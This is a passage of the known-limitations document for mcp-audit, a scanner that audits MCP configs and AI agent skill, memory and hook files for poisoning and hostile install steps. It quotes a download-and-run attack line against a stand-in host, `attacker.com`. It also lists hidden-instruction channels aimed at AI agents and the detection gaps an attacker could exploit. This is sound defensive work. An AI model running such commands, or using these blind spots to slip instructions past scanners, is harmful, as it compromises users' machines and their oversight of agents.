**`asset_prefix` is not persisted in scan JSON output.** The `--asset-prefix` passed to `mcp-audit scan` is not stored in the resulting JSON file. When merging, `--asset-prefix PREFIX` filters by machine hostname prefix (machine_id), not by a stored asset_prefix field. Machines must be named with a meaningful prefix (e.g. `prod-laptop-adam`) for prefix filtering to be useful.

**Version mismatch detection uses string equality, not semver ordering.** A machine running `0.1.0` and a machine running `0.1.1` are both reported as mismatches against the majority version. There is no "close enough" tolerance — any version string difference triggers a warning.

## Policy-as-code rule engine

**Compound rule `matched_value` may be verbose for OR rules with many conditions.**
For compound `OR` rules, `matched_value` is constructed by joining all matched
condition values with `"; "`. If multiple conditions fire simultaneously, the
resulting `matched_value` string in the finding description and evidence can be
long and repetitive. This is intentional (full transparency) but may surprise
users expecting only the first matched value.

**Rule ID deduplication keeps first-alphabetical file, which may be surprising.**
When `load_rules_from_dir()` encounters two files with the same rule ID, it keeps
the rule from the alphabetically-first filename. Users who place a later-named file
hoping to override an earlier one will find the earlier definition takes precedence.
Use a `primary` + `secondary` pattern (via `merge_rules()`) for intentional
overrides — user-supplied directories are always treated as primary over bundled
community rules.

**Community rule false-positive rate is unmeasured.**
The 15 community rules were written to cover clear-cut cases (netcat as binary,
eval in args, etc.) but have not been validated against a broad sample of
real-world MCP server configurations.

**TRANSPORT-003 tiered by registry membership (2026-04-20).**
The runtime-package-fetching finding (`TRANSPORT-003`) previously fired at
MEDIUM for every server launched via `npx`, `uvx`, or `bunx`, including the
official `@modelcontextprotocol/server-*` packages. Because MEDIUM findings
trigger exit 1 at the `--severity-threshold medium` gate and contribute to
score deductions, this was the same signal-to-noise trap as COMM-004 — the
rule fired on 100% of registry-legitimate servers.

`TransportAnalyzer` now accepts an optional `KnownServerRegistry` (shared
with `SupplyChainAnalyzer` so the JSON is loaded exactly once per scan) and
tiers TRANSPORT-003 severity by registry membership:

- Verified registry entry → finding suppressed. COMM-010 (`npx used without
  pinned version`, LOW) still raises the pinning reminder.
- Known but unverified registry entry → LOW with tailored description
  pointing to `--verify-hashes`.
- Unknown package or no registry → MEDIUM (historic behaviour; strong alarm).

See `src/mcp_audit/analyzers/transport.py::_build_runtime_fetch_finding`
and `tests/test_analyzers.py::TestTransportRuntimeFetchRegistryTiering`.

**COMM-004 rescoped to unrecognized stdio servers (2026-04-20).**
The original COMM-004 (`stdio transport in use`) fired on every stdio MCP
server. Because stdio is the universally-implemented MCP transport today —
including every official `@modelcontextprotocol/server-*` package — the rule
was noise on 100% of real configs and made exit 0 unreachable at the default
`--severity-threshold INFO`. A finding that fires on every target is not a
signal.

Decision: **Option C — scope the rule to unrecognized servers.** Rather than
removing the rule outright or reducing severity (which would not lower the
false-positive rate), the rule engine now supports `exempt_known_servers:
true` on any `PolicyRule`. When set, the engine skips servers whose command,
any argument, or server name matches an entry in the known-server registry.
COMM-004 declares `exempt_known_servers: true`, so it now fires only on
stdio servers the registry cannot resolve (local scripts, unknown packages,
arbitrary binaries). This preserves the rule's signal ("verify this binary
is trusted") for the cases that actually need verification while removing
the noise on vetted packages. Severity stays LOW.

This is expected to be revisited when SSE/HTTP transports become common in
the MCP ecosystem; a future scope might distinguish servers that *declare*
stdio when a remote transport would be expected. See
`rules/community/COMM-004.yml`, `src/mcp_audit/rules/engine.py`
(`PolicyRule.exempt_known_servers`, `_server_in_registry`), and
`docs/writing-rules.md` for details.

**STDIO-001/002a/002b: launch-command trust boundary rules (STORY-0067,
2026-09-09).** See `humans/decisions/2026-09-09-stdio-001-002-design.md`
(marcus repo) for the full design. Three gaps this story deliberately did
not close, recorded here rather than smoothed over:

- **"Outside the scanned root" was dropped from STDIO-002, amending epic
  decision #1.** The rule engine has no notion of a project or scan root —
  `MatchField` offers only `command`, `args`, `env`, `server_name`, `url`,
  `transport`, `capabilities`, `config_path`; there is no way to express
  "this path resolves outside the directory being scanned" in that
  vocabulary, and this story did not relocate the criterion into Python.
  It was also a bad criterion on its own terms: every ordinary launcher
  (`npx`, `node`, `uvx`, a `~/.nvm/...` shim) resolves outside the project,
  so an "outside-repo" rule would fire on nearly every server on every
  machine for no signal. The Deadbugz shape it was meant to catch is fully
  covered by STDIO-002a's hidden-leaf test instead (see below).
- **Hidden-leaf detection (STDIO-002a) is a POSIX convention only.**
  Dot-prefixed hidden files/directories are a POSIX shell convention; on
  Windows this rule contributes no signal (`command` there is not
  dot-hidden by any OS or shell convention). No Windows-equivalent
  detection has been designed or measured.
- **STDIO-001 ships `enabled: false` with no way to turn it on.** The
  design asked this story to verify whether a governance policy can enable
  a disabled community rule, and to stop and report rather than build that
  plumbing if it does not exist. It does not exist:
  `PolicyRule.enabled` is read once, statically, from the rule's YAML
  (`RuleEngine.match_server` skips the rule unconditionally when
  `enabled: false`), and `grep -rn "enabled" src/mcp_audit/governance/`
  returns zero matches. STDIO-001 therefore ships as a rule nobody can
  currently turn on short of hand-editing
  `<user-config-dir>/mcp-audit/rules/` with a copy that sets
  `enabled: true`, or passing `--rules-dir` at a directory containing such
  a copy. Wiring a governance-policy toggle for a specific bundled rule ID
  is unbuilt and is its own future story, not a side effect of this one.
  **Corrected R47 (2026-09-09):** `STDIO-001` was originally scoped (see the
  EPIC-0006 design notes) to count toward the community-rule maturity/gate
  metric alongside every other bundled rule. It does not, and should not,
  count toward any such metric: a rule that cannot be enabled by anyone
  cannot contribute a capability, so counting it inflates that number
  without inflating real coverage. `PROVENANCE.md`'s community-rules count
  now states the enabled-by-default figure (35) separately from the total
  real-rule figure (36) for this reason.

## Pre-commit hook

**Hook re-scans all configs on every triggered commit, not just staged ones.** `pass_filenames: false` is required because mcp-audit uses its own client-aware discovery rather than accepting individual filenames. As a side effect, on large multi-client machines (e.g., Claude Desktop + Cursor + VS Code + Windsurf all configured), the hook re-scans all discovered configs even if only one JSON file was staged. Scan time is proportional to total server count across all clients, not to the size of the diff. On typical developer machines this is well under 5 seconds, but may be surprising on machines with dozens of MCP servers.

**Hook not tested with `--from-ref`/`--to-ref` diff modes.** The pre-commit framework supports running hooks in diff mode (e.g., `pre-commit run --from-ref HEAD~1 --to-ref HEAD`). Because `pass_filenames: false` bypasses the normal file-list mechanism, diff-mode invocations produce the same full-machine scan rather than a diff-scoped scan. This is consistent with the hook's design intent but has not been tested end-to-end with the pre-commit framework's diff infrastructure.

## Governance

**Client name matching uses string comparison.** The `client_overrides` map is
keyed by the client's `client` field value (e.g. `"cursor"`, `"claude-desktop"`).
Typos in override keys are silently ignored — the base policy applies to those
clients instead. Valid client keys are: `claude-desktop`, `cursor`, `vscode`,
`windsurf`, `claude-code`, `copilot-cli`, `augment`. There is no validation that
override keys match known client names; unknown keys are ignored without warning.

**Score threshold check requires a completed scan.** `ScoreThreshold.minimum`
is only evaluated when a `ScanResult` with a populated `score` field is passed to
`evaluate_governance()`. Running `policy check` (governance-only mode) omits
scores because no analyzers are run. Combine with a full `scan --policy` to
enforce score thresholds.

**Approved server glob matching is fnmatch-style, not full regex.** Pattern
matching uses Python's `fnmatch.fnmatch()` which supports `*` (any characters),
`?` (single character), and `[seq]` character classes. Unlike shell globbing,
fnmatch `*` matches `/` characters, so `@modelcontextprotocol/*` matches
`@modelcontextprotocol/server-filesystem` as expected. Full regex patterns are
not supported.

**Source detection is inferred from command basename only.** `npx`/`node`/`npm`
→ npm; `python`/`python3`/`uvx`/`uv`/`pip`/`pipx` → pip. Servers launched via
absolute paths, shell scripts, or custom wrappers return `None` source. Such
servers will never match a `source:`-filtered approved-server entry regardless of
the server name.

**Finding policy counts exclude governance findings but not baseline findings.**
`FindingPolicy.max_critical` etc. count only non-governance findings from
`scan_result.findings` at the time `evaluate_governance()` is called. Baseline
drift findings (injected before governance evaluation) are counted, which may
cause unexpected policy violations when combining `--baseline` with
`finding_policy`.

## SAST Rules

The Semgrep SAST rule pack (`semgrep-rules/`) has the following known limitations:

**Heuristic rules with high false positive risk:**
- `mcp-open-path-traversal` and `mcp-pathlib-open-traversal` fire on any variable path in an async function, including validated paths. Suppress with `# nosemgrep` when path validation is present.
- `mcp-no-type-check-before-use` fires when `arguments.get()` is used without an immediately adjacent `isinstance()` check, even when the MCP SDK provides type validation at the protocol level.
- `mcp-flask-no-ssl` matches any `$APP.run(...)` call; explicitly excludes `subprocess.run` and `asyncio.run`, but may fire on other `.run()` patterns.

**TypeScript SAST parity substantially improved (v0.7.0 and v0.9.0):**
- Python has 38 rules across 6 categories; TypeScript has 35 rules across 6 categories.
- v0.7.0 added 11 new TypeScript rules across 5 categories: credential default params,
  secrets in console output, URL/base64/unicode in tool descriptions, missing input
  validation, stack trace exposure, and listen-all-interfaces.
- v0.9.0 added MCP Sampling injection rules (Python + TypeScript), SSRF validation-path
  rules (Python + TypeScript anchored to CVE-2026-44284, CVE-2026-39974, CVE-2026-27826),
  and a TypeScript SDK singleton transport rule (CVE-2026-25536).
- Remaining parity gaps (Python-only, no TS equivalent): hardcoded connection strings,
  `app.run()` without SSL, and f-string SQL injection. These Python-specific patterns
  have no idiomatic TypeScript equivalent in Semgrep OSS without taint analysis.

**Rules target server source code, not installed binaries:**
- SAST rules require access to the server implementation source code. They cannot scan pre-built npm packages, PyPI wheels, or Docker images. Config scanning (`mcp-audit scan`) remains the primary defense for production deployments.

**Semgrep is not bundled in the mcp-audit binary:**
- `mcp-audit scan --sast` and `mcp-audit sast` require `pip install semgrep` separately. The rule files are bundled; the semgrep engine is not. This matches how other SAST tools (bandit, eslint, etc.) work in the ecosystem.
- Rule file discovery works correctly in all installation modes: PyInstaller binary, `pip install mcp-audit-scanner` wheel, and editable dev installs. The resolution uses `mcp_audit._paths.resolve_bundled_resource()` with an `importlib.resources` step so that pip-installed wheels find `mcp_audit/semgrep-rules/` without requiring a source checkout.

**SSRF guards that only block IP literals (`mcp-ssrf-ip-literal-only-guard`, `mcp-ts-ssrf-ip-literal-only-guard`, STORY-0081):**
- Both rules can't tell which way a guard's return value points. `except ValueError: return False` is fail-open in `is_blocked()` but fail-closed in `is_safe()`. The rules exclude a handler that raises or throws and report the rest; a fail-closed guard that returns needs `nosemgrep`.
- A guard is recognised only by its private-range check: `is_private` / `is_loopback` / `is_link_local` / `is_reserved` / `is_global` in Python; an ipaddr.js `.range()` call, a private-range string or regex literal, or a call named like `isPrivate` / `isInternal` in TypeScript. A guard that tests `ip in BLOCKED_NETWORKS`, or a TypeScript class method, is missed.
- DNS rebinding is out of scope. A guard that resolves the name and checks every address is treated as safe even when the request then resolves the name again. Pinning the connection to the checked address is a dataflow property these pattern rules can't see.

**No taint analysis:**
- Current rules are pattern-based, not dataflow-aware. A variable URL used for SSRF only fires if the HTTP call is in the same function, not if the URL is passed from an outer scope. Full taint tracking requires Semgrep Pro rules (dataflow mode).

## IDE Extension Scanner

**Capability classification is heuristic.**  False positives are possible on complex
extensions with unconventional manifests.  The `filesystem`, `network`, `terminal`,
`authentication`, `debuggers`, and `ai_related` capability tags are inferred from
keywords, description text, contributes keys, and activation events in `package.json`.
Runtime behaviour (JS bundle analysis) is not examined.

**Version matching uses simplified prefix comparison, not full semver ranges.**
The `check_known_vulns()` function handles `"*"` (any version) and `"<X.Y.Z"` (integer
tuple comparison only).  Ranges like `">=1.0.0 <2.0.0"`, `"^1.0.0"`, `"~1.2.3"`, and
compound expressions are not parsed and will not match.  Track this as a future task if
the vuln registry grows entries with complex version constraints.

**Discovery paths are hardcoded per-client and may not cover all configurations.**
The paths in `EXTENSION_PATHS` were validated on macOS with VS Code and Cursor; Windsurf
and Augment paths were not found on the build machine.  Paths may differ by:
- OS version (macOS vs Linux vs Windows)
- Client version (path changes between major versions)
- Custom install location (non-default `--extensions-dir`)

**~~Windows extension paths are not validated.~~  Resolved 2026-04-30 (STORY-0004).**
Standard Windows paths are now defined in `_get_windows_paths()` in
`extensions/discovery.py` and merged into `discover_extensions()` at call time:
`%APPDATA%\Code\extensions` and `%APPDATA%\Code - Insiders\extensions` (VS Code),
`%USERPROFILE%\.cursor\extensions` (Cursor), and
`%USERPROFILE%\.windsurf\extensions` (Windsurf).  All four paths are covered by
monkeypatched unit tests that run on every CI platform.  End-to-end validation on a
real Windows host is a manual step deferred to pre-launch.

**No runtime behaviour monitoring.**  The scanner analyses static manifest data only.
Malicious extensions that hide capabilities inside their JS bundle (e.g. deferred
imports, obfuscated network calls) will not be detected by this approach.

**Fleet extension inventory via `merge` not yet implemented.**  The `fleet_extensions`
feature key is reserved but `mcp-audit merge` does not yet aggregate extension findings
across machines (post-launch roadmap).

## Agent-file surface coverage (skills, memory, hooks)

**Shipped 2026-06-14 (Phases 1–3), extended 2026-09-08 (STORY-0065):** The
`src/mcp_audit/agent_files/` package is implemented and tested. Confirmed
surfaces in `agent_files/discovery.py`: Claude Code commands
(`~/.claude/commands/`, `.claude/commands/`), Claude Code skills
(`~/.claude/skills/**/SKILL.md`, `.claude/skills/**/SKILL.md`, added
2026-09-08 — see the dedicated section below), Claude Code memory (`CLAUDE.md`
tiers), Cursor rules (`~/.cursor/rules/`, `.cursor/rules/`), GitHub Copilot
workspace instructions, scoped instructions, and prompt templates.
Hook analysis (`HOOK-001`, `HOOK-002`) extends `ConfigHygieneAnalyzer`.
Known limitations per finding:

- **SKILL-003** fires on all `http(s)://`, `ftp(s)://`, `ws(s)://`, and inline
  `data:` URIs in instruction files, including legitimate documentation links in
  `.github/copilot-instructions.md`. False-positive rate is moderate on Copilot
  instruction files that reference their own repo or third-party docs.
  Mitigation: `--severity-threshold medium`.
- **HOOK-001** pattern may fire on local test scripts that contain `nc` (netcat)
  as a tool invocation if the argument structure matches. Edge case; no known FP
  in the current benchmark.
- **MEM-002** (zero-width Unicode, POISON-040) fires even on CLAUDE.md files
  that have copy-pasted content from a source that embedded invisible Unicode.
  Inspect with `cat -A` or a Unicode hex dump to confirm.

The sections below document unconfirmed client paths for future phases.
Confirmed paths are implemented; unconfirmed paths are tracked here until
official documentation or environment probes validate them. Do not write
discovery or analysis code for unconfirmed paths — add them to
`agent_files/discovery.py` only when confirmed.

**Phase design decisions recorded 2026-06-14:**
- Copilot prompt files (`.github/prompts/*.prompt.md`) scanned at the same
  severity tier as instruction files; executable templates carry equal or higher
  risk, not lower.
- Memory analyzer (MEM-001/MEM-002) uses a restricted pattern subset:
  POISON-010 (XML injection markers), POISON-011 (LLM format markers),
  POISON-040 (zero-width Unicode), POISON-060 (homoglyphs) only. All other
  PATTERNS entries — including POISON-050 (excessive length) — are excluded
  from memory analysis to control false-positive rate on innocuous large files.
- `--include-agent-files` flag includes project-tree walking for
  `.claude/commands/`, `.cursor/rules/`, and `.github/` subtrees; the
  cloned-malicious-repo scenario is the primary attack vector.
- Hook content analysis (HOOK-001, HOOK-002) extends
  `ConfigHygieneAnalyzer.analyze_config()` (via new `_check_hook_commands()`
  helper) rather than splitting into a separate analyzer. Hook responsibility
  stays with the config-hygiene analyzer.
- OWASP mappings confirmed: SKILL-001/002/003 → MCP03 (Prompt Injection)
  + MCP01 (Token Mismanagement); HOOK-001/002 → MCP05 (Command Injection)
  + MCP07 (Insufficient Auth); MEM-001/002 → MCP03.

---

### Windsurf — skill/memory/hook files

**Status: unconfirmed. No code written.**

Windsurf's global MCP config (`~/.codeium/windsurf/mcp_config.json`) is
already discovered by `discovery.py`. However, Windsurf's equivalents of
Claude Code memory files (`CLAUDE.md` tiers) and Cursor rules (`.mdc` files)
are not documented in the official Codeium/Windsurf developer docs as of
2026-06-14.

**What is unknown:**
- Whether Windsurf reads a `WINDSURF.md`, `~/.windsurf/rules/`, or similar
  freetext-instruction file into the agent context.
- Whether Windsurf supports a hook or lifecycle-command API analogous to
  Claude Code's `preToolUse` / `postToolUse` hooks.
- Whether the Codeium extension pack has an instruction-file mechanism visible
  to the agent (distinct from VS Code Copilot instructions).

**Action:** Add confirmed paths to `agent_files/discovery.py` WINDSURF entry
when Codeium publishes documentation or a path is validated via environment
probe. Until then, `agent_files/discovery.py` omits Windsurf from skill/memory
discovery (the MCP config path remains in `discovery.py` as before).

---

### Augment — skill/memory/hook files

**Status: unconfirmed. No code written.**

Augment's global MCP config (`~/.augment/settings.json`) is already
discovered by `discovery.py`. Augment's instruction/memory surface is not
publicly documented.

**What is unknown:**
- Whether Augment reads a project-level instruction file (e.g., `AUGMENT.md`,
  `.augment/instructions.md`, or a `context:` block in its settings file).
- Whether Augment exposes a hooks or lifecycle-command API.
- Whether Augment uses VS Code extension APIs that would make the Copilot
  instruction files (`.github/copilot-instructions.md`) available to it as
  well.

**Action:** Add confirmed paths when Augment publishes developer documentation
or a path is validated via probe. If Augment reads VS Code Copilot instruction
files as part of its VS Code extension, those paths are already covered by the
Copilot discovery in `agent_files/discovery.py`.

---

### Kiro — MCP config and skill/memory/hook files

**Status: unconfirmed. No code written.**

`~/.kiro/settings/mcp.json` was referenced as a credential-theft target in
the 2026-04-22 supply-chain malware analysis (Bitwarden npm package), which
confirms the path exists and is used by an active client. However, no
Kiro/AWS Kiro developer documentation is publicly available as of 2026-06-14
to confirm the exact schema, root key (`mcpServers` vs `servers` vs other),
or whether project-level files exist.

**What is unknown:**
- Exact JSON root key for Kiro's MCP config (`mcpServers`? `servers`?
  `context_servers`?).
- Whether Kiro supports project-level MCP configs analogous to `.mcp.json`.
- Whether Kiro reads a `KIRO.md` or `.kiro/instructions.md` file into agent
  context.
- Whether Kiro exposes a hooks API.
- Platform availability: Kiro was announced for macOS and Windows; Linux
  support is unconfirmed.

**Action (MCP config):** When Kiro publishes documentation, add a `ClientSpec`
entry to `_get_client_specs()` in `discovery.py` with the confirmed path and
root key. Until then, mcp-audit will not discover or scan Kiro MCP configs,
which is a false-negative risk for Kiro users.

**Action (skill/memory/hook):** Add to `agent_files/discovery.py` after the
MCP config path is confirmed.

---

### `.claude/skills/` — Claude Code skills directory

~~**Status: unconfirmed. No code written.**~~ **Resolved 2026-09-08
(STORY-0065).** `.claude/skills/**/SKILL.md` (both `~/.claude/skills/` and
`.claude/skills/`, matched recursively at any nesting depth up to the
module's shared walk cap) is now confirmed and implemented under the
`CLAUDE_SKILL` (`AgentFileSurface.CLAUDE_SKILL` = `"claude-code-skills"`)
surface key in `agent_files/discovery.py`, driven by the same
`AGENT_INSTRUCTION_PATTERNS` table as every other surface. Skill files run
through the same SKILL-001/002/003 poisoning checks as commands and
Cursor/Copilot instruction files, plus a new inventory-only finding,
`SKILL-004` (INFO), that lists (never opens) the filenames in a skill's own
`scripts/` subdirectory when one exists.

**Known boundary:** `SKILL-004` is a filename inventory, not a
content-based detection. Since STORY-0095 the contents of every file in a
skill folder, scripts included, are read (never executed) for SKILL-005..008;
see "Skill packages (STORY-0095)" below.

---

### Skill packages (STORY-0095)

SKILL-005..008 read every file in a skill folder (`docs/skill-packages.md`).
Known limits, each measured or stated, not guessed:

- **A plain `curl … | sh` is LOW, not MEDIUM.** On 1,129 ordinary skills
  (corpus fetched 2026-10-25, re-measured 2026-10-27), 9 lines pipe or
  download-and-run a third-party installer (LOW) and 12 more are vendor
  installers, Dockerfile lines or advice against the shape (INFO). Raising
  the plain shape would put a MEDIUM on ordinary skills, so a plain pipe from
  an unlisted host stays LOW; only the concealed shapes (TLS off, decoded,
  plaintext, raw IP, decode-then-execute) are HIGH. A malicious skill that
  pipes an ordinary-looking https installer is LOW.
- **The vendor-installer list is a list.** A compromised vendor-hosted script
  is INFO. The list (`install_steps.VENDOR_INSTALLERS`) needs maintenance as
  installers move.
- **Archives are not unpacked**, and 7-Zip/RAR encryption is not checked (ZIP
  encryption is). Archives are reported as SKILL-007 LOW.
- **Git objects are not parsed.** Git's text records in `.git/` are read
  (SKILL-005 sees a command in `COMMIT_EDITMSG` or `description`), and git's
  binary files are checked only by their first bytes (zlib for a loose object,
  `PACK`, `\377tOc`, `DIRC`, `CGPH` …). A payload committed as a real blob
  (loose or packed, so the bytes really are git's) and extracted with `git
  show` at run time is not seen, and `git show … | sh` is not an install-step
  shape. Git LFS objects (`.git/lfs/objects/`) are the repository's own large
  files of any type and are not checked.
- **Dependency folders** (`node_modules`, `.venv`, `venv`, `site-packages`,
  `bower_components`) are not walked; each is reported as SKILL-007 LOW.
- **Windows junctions and other reparse points.** Reads are refused when the
  resolved path leaves the scan root (and the refusal is recorded in the
  scan's `errors`), and `O_NOFOLLOW` stops a symlink swapped in after the
  walk. Windows has no `O_NOFOLLOW`, and a directory junction is not a
  symlink to `os.scandir`, so the walk may enter a junction inside a skill;
  what it reaches is still read only when it resolves inside the scan root.
  Not tested on Windows.
- **Nested skills follow discovery.** A folder inside a skill that has its own
  `SKILL.md` is analysed as its own skill only when skill discovery returns it
  (same skip list, at most eight levels below the skills directory);
  otherwise it is read as part of the enclosing skill, so an empty
  `SKILL.md` in `__pycache__/` or `.tox/` hides nothing.
- **Symlinked skill folders are followed one level only** (decision
  2026-10-26, Marcus `humans/decisions/2026-10-26-follow-symlinked-skill-folders.md`).
  A symlink directly under a skills directory that points at a skill is read
  at its target (TRUST-004 INFO), which covers the skills CLI's default
  install (`.claude/skills/<name>` → `.agents/skills/<name>`); a repository's
  link whose target is outside the repository is TRUST-002 HIGH and not read.
  Every other symlinked directory (one nested deeper, one inside a skill, a
  link to a folder that holds several skills) is still not traversed
  (TRUST-005), although Claude Code may load what it points at.
- **`allowed-tools` grants and `` !`cmd` `` lines are not checked.** A
  frontmatter `allowed-tools` grant pre-approves tools for the skill's turn;
  `` !`cmd` `` (dynamic context injection) runs when the skill loads. Neither is
  tiered specially; an install-step shape on such a line is still SKILL-005.
- **Steering without a command is not detected** ("Do not use npx paperclipai",
  "always install from this fork").
- **Long logical lines are matched in 16 KiB windows** with 512 characters of
  overlap; a fetch and its sink more than 512 characters apart across a window
  edge are missed. A text file over 1 MiB is read to the cap and reported
  (SKILL-007 MEDIUM).
- **A skills-directory plugin's MCP config listed by path** in
  `plugin.json` (`"mcpServers": "./servers.json"`) is reported (SKILL-006) but
  does not join discovery; `.mcp.json` at the plugin root and inline
  `mcpServers` do.
- **Carried MCP configs** (a `.mcp.json` in a skill that is not a plugin) go
  through the poisoning, credential, transport, config-hygiene and auth
  analyzers but not supply chain or toxic flow, because they never join
  discovery.
- **Nested project plugins are reported.** Claude Code loads skills-directory
  plugins only from the primary working directory's `.claude/skills`; `scan
  --project` reports plugins under every `.claude/skills` in the tree, as it
  does for nested `.mcp.json` files.
- **Context is not judged.** A skill that switches permission prompts off
  inside a dev container it builds (trailofbits `devcontainer-setup`) gets the
  same SKILL-006 HIGH as one that does it on the host, and a security
  reference that quotes an attack command (trailofbits
  `agentic-actions-auditor`: `echo $(curl attacker.com/payload | sh)`) gets
  the same SKILL-005 HIGH as an instruction to run it. These are the two
  benign MEDIUM+ skills in the 1,129-skill corpus.
- **Harness flags are matched case-sensitively** (`claude`, `codex`, `gemini`,
  `qwen`), so prose naming "Gemini CLI" does not fire; an invocation written
  `Claude --dangerously-skip-permissions` is not matched.
- **Cost.** Measured 2026-10-27 on a 2-core VM: about 20 ms of CPU per
  ordinary skill (1,129 skills in about 22 s) and up to about 3 s per MiB of
  text written to defeat the per-file pattern gates; the test suite requires
  each such input of about 1 MiB to finish in under 6 s. Budgets (8 MiB per
  skill, 32 MiB per scan, 1 MiB of frontmatter YAML per scan) bound each pass
  over a hostile repository: `check` in a repository whose skills fill the
  32 MiB budget with such text took 61 s (50 s CPU), and one 11 MiB hostile
  skill, read to its 8 MiB budget, 15 s. `scan --project` makes two passes
  (the working directory's skills and the tree's). Anything past a budget is
  reported.
- **The opt-in sidecar pass drops filesystem errors.** The default pass over
  the same skills records them in `errors`.

---

### VS Code Copilot — user-global instruction files

**Status: partially confirmed. Not yet implemented.**

Workspace-level Copilot instruction files (`.github/copilot-instructions.md`,
`.github/instructions/*.instructions.md`, `.github/prompts/*.prompt.md`) are
confirmed and implemented in `agent_files/discovery.py` for project-tree
walking.

**What is unconfirmed:**
- A user-global Copilot instruction file on macOS/Linux (the Windows path
  `%APPDATA%\Code\User\prompts\` is referenced in VS Code docs but its
  macOS/Linux equivalent — `~/Library/Application Support/Code/User/prompts/`
  or `~/.config/Code/User/prompts/` — has not been probed on the build machine).
- Whether Copilot respects user-global instruction files outside a workspace
  context.

**Action:** Probe `~/Library/Application Support/Code/User/prompts/` (macOS)
and `~/.config/Code/User/prompts/` (Linux) on a machine with VS Code + Copilot
installed. If present, add to `agent_files/discovery.py` COPILOT user-global
entry. Until confirmed, only workspace/project-tree paths are discovered.

---

### `.claude/agents/` — Claude Code subagent definitions (AGENT-001..004, STORY-0094)

**Status: implemented, with these known limits.**

- **Installed Claude Code version is not read.** AGENT-001 (`bypassPermissions`,
  fixed in 2.1.267) and AGENT-003 (frontmatter hooks, trust-gated since 2.1.218)
  use the severity that holds on current versions and state the older-version
  HIGH case in their text. Reading the installed version without running the
  binary is the epic's "harness version-floor table", queued separately.
- **Default scan reads only the cwd's `.claude/agents/`**, not the
  `.claude/agents/` directories between the cwd and the repository root that
  Claude Code also loads. `scan --project <root>` walks them all.
- **Not read:** plugin `agents/` directories (Claude Code ignores
  `permissionMode`, `hooks` and `mcpServers` there, so only body text would be
  in play), managed-settings agents, and agents passed with `--agents` or the
  SDK `agents` option (not files). Agent files under `CLAUDE_CONFIG_DIR` are not
  read either; user-level agents resolve under `$HOME`, like skills.
- **Frontmatter parsing is not Claude Code's parser.** Claude Code (2.1.310)
  parses with Bun's YAML 1.2 parser and, on a parse error, quotes one-line
  values that contain YAML indicator characters or `: `, turns leading tabs
  into spaces and re-parses the block (its retry pattern does not match a line ending in `\r`;
  mcp-audit also retries a CRLF file with LF endings, as another platform's
  checkout would read it). mcp-audit does the same split, retry and tab
  handling with PyYAML (YAML 1.1 syntax, with the YAML 1.1 `=` and
  timestamp resolvers turned off so those stay strings, as in 1.2), and also
  reads the block up to the first `---` line; findings from every reading are
  kept. The two parsers can still disagree on unusual YAML: a security key
  mcp-audit cannot read in any reading is a finding at that key's scope
  severity ("present but unreadable by mcp-audit; Claude Code may load it"),
  but a key PyYAML reads differently from Bun is not detected. Values are
  matched exactly as documented (`bypassPermissions`, not `BypassPermissions`).
- **Repeated keys.** A security key repeated at the top level is a finding and
  every value is checked. A repeat nested inside a value (two `command:` keys
  in one hook, two names in one `mcpServers` item) takes PyYAML's last value
  only; which one Claude Code keeps is undocumented. YAML merge keys (`<<:`)
  are not expanded the way YAML 1.1 does; they are read as an ordinary key.
- **Size and nesting budgets.** Files over 1 MiB are skipped (as Claude Code
  skips them) and reported in the scan's `errors`. A frontmatter nested deeper
  than 256 levels, or with more than 20,000 YAML nodes or 100,000 values after
  aliases are resolved, is not read; any security key it names is reported as
  unreadable. The nesting count is estimated from indentation before parsing,
  so a block scalar indented 129 spaces or more (ASCII art in a description,
  say) also reads as too deep, and any security key in that frontmatter is
  reported as unreadable; the estimate errs toward reporting.
- **Per-scan budget.** A scan reads at most 500 definitions or 16 MiB of them in
  full. Claude Code has no such limit, so the next 5,000 are pre-screened: the
  first 64 KiB of each is read and every security key its frontmatter names is
  a "present but unreadable" finding with the reason "per-scan limit reached"
  (HIGH for `permissionMode`, `hooks` and `mcpServers` in a project directory,
  which a repository can reach by padding its agents directory; the key's own
  severity in `~/.claude/agents/`). A frontmatter that runs past the 64 KiB
  window with no closing `---` line in it is reported for `permissionMode`,
  `hooks` and `mcpServers` whether or not they were seen (reason "frontmatter
  runs past the pre-screen window"). Their values are not checked: a hook's
  command or a server's launch line past the budget gets no HOOK-001/002 or
  per-server check. Past 5,000 one aggregate AGENT-003 (HIGH in a project,
  INFO in `~/.claude/agents/`) counts the definitions not read at all. The
  pre-screen costs about 3 ms per file at worst (measured), so the ceiling
  bounds it at roughly 15 to 20 seconds.
- **Symlinks.** A symlinked agent file is read and reported as
  TRUST-002/TRUST-004, like every other agent file. A symlinked directory under
  `.claude/agents/` is not followed (TRUST-005 names it under `--project`), as
  elsewhere in discovery; Claude Code may follow it, so agents behind it are
  not scanned.
- **A file with frontmatter is treated as a definition** even without the
  required `name`/`description`, which Claude Code would refuse to load, so a
  half-written file can still produce findings.
- **`mcpServers` items must be one-key mappings or strings**, as in Claude
  Code. A mapping in place of the list, or a multi-key item, is ignored. A
  string item names a server defined elsewhere and is not reported. A name
  repeated within one file is kept as `name#2`, `name#3`, because Claude Code
  starts every item.
- **Duplicate inline server names across agent files** share one rug-pull key
  (`claude-code-agent/<name>`); the last file in path order is tracked, as with
  any duplicate client/name pair. Shadow likewise lists the name once.
- **Inline servers are never locked.** Like plugin servers they are left out of
  `mcp-lock.json` and skipped by scan's automatic lock check. A project
  subagent's server under a lock root is listed in `lock_status.not_covered`,
  printed as a WARN line, and raises AGENT-004 to MEDIUM; the lock still does
  not verify it. User-level subagents are not checked against any lock.
- **Body text is scanned only where skills are** (`--include-agent-files`,
  `agent-files scan`), with the skill rule set minus the length check. SKILL-003
  (external URL, MEDIUM) fires on a subagent prompt that links to documentation,
  as it does for skills and Cursor rules.
- **`dontAsk` is not flagged**: it auto-denies anything that would prompt, so it
  is stricter than `default` (permissions doc).
- **Not covered:** `tools: Agent(...)` type lists, which Claude Code ignores in a
  subagent definition (they apply only to `claude --agent`); `disallowedTools`
  `mcp__<server>` entries that were silently ignored before Claude Code 2.1.178.

---

## Concealment channel detection (POISON-041/042, STORY-0068)

Design doc: `humans/decisions/2026-09-09-poison-041-design.md` (marcus repo).
Deliberate scope limits, recorded rather than smoothed over:

- **Only two channel types are covered:** Unicode TAG-block runs
  (U+E0020–U+E007E, decoded per UTS #39) and HTML comments (`<!-- ... -->`).
  Other known Unicode covert channels — Variation Selectors (U+FE00–FE0F,
  U+E0100–E01EF; the "emoji variation selector smuggling" technique) and
  Private Use Area codepoints — are not covered. Not measured, not built;
  a future pass would need the same "extract into its own string, decode,
  rescan independently, never splice back" design this story established,
  plus its own false-positive measurement (Variation Selectors have a
